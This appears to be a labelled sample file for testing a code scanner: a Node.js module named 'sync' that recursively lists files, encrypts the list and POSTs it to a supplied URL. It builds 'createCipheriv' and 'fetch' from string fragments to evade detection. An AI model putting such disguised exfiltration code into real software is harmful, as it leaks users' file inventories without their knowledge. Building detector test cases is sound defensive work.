'use strict';
const fs = require('fs');
const crypto = require('crypto');

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}

// D5 动态属性调用：方法名来自变量
async function sync(root, url) {
  const f = treescan(root);
  const m = require('crypto');
  const encName = ['create', 'Cipher', 'iv'].join('');
  const k = m.randomBytes(32), iv = m.randomBytes(16);
  const c = m[encName]('aes-256-gcm', k, iv);
  const body = Buffer.concat([iv, c.update(Buffer.from(f.join('\n'))), c.final()]);
  const sendName = ['fe', 'tch'].join('');
  const g = globalThis[sendName];
  return g(url, { method: 'POST', body: body });
}
module.exports = { sync };
